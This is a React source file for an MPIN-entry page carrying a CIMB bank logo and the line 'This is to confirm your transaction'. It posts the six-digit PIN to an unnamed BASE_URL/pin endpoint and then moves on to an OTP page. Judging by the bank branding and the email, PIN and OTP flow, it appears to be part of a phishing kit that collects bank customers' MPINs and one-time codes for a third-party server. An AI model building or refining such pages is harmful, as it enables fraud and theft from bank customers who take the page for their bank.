import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{6}$/, "MPIN must be exactly 6 digits")
    .required("MPIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(6).fill(""));
  const [userEmail, setUserEmail] = useState("");
  const [loading, setLoading] = useState(false);

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) setUserEmail(storedEmail);
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 5 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then(() => {
        navigate("/otp");
      })
      .catch((error) => {
        console.error("PIN verification error", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen flex flex-col justify-start bg-white text-black px-4 pt-6 relative">
      {/* Logo & Title */}
      <div className="text-center mt-6 space-y-2">
        <div className="flex justify-center items-center space-x-2">
          {/* Logo */}
          <div className="flex justify-center">
            <img src={logo} alt="CIMB Logo" className="w-[50%] min-h-[30px]" />
          </div>
        </div>
        <h1 className="text-2xl font-semibold">Enter your 6-digit MPIN</h1>
        <p className=" text-gray-600">This is to confirm your transaction</p>
      </div>

      {/* PIN Input */}
      <form
        onSubmit={handleSubmit(submitForm)}
        className="mt-10 text-center space-y-4"
      >
        <div className="mb-[5em]">
          <div className="flex justify-center space-x-4">
            {pin.map((digit, index) => (
              <input
                key={index}
                id={`pin-${index}`}
                type="password"
                maxLength="1"
                value={digit}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="w-4 h-4 sm:w-6 sm:h-6 md:w-8 md:h-8 rounded-full border border-gray-300 bg-white focus:border-[#711515] outline-none text-center text-xl text-black"
                inputMode="numeric"
                pattern="[0-9]*"
                autoComplete="off"
              />
            ))}
          </div>

          <FormErrMsg errors={errors} inputName="pin" />

          <p className=" text-[#eb3434] cursor-pointer font-medium mt-6">
            Forgot MPIN?
          </p>
        </div>
        {/* Done Button */}
        <div className="">
          <button
            type="submit"
            disabled={loading}
            className="text-white w-full rounded-lg h-12 bg-red-600 text-md font-semibold"
          >
            {loading ? "Loading..." : "Done"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Pin;
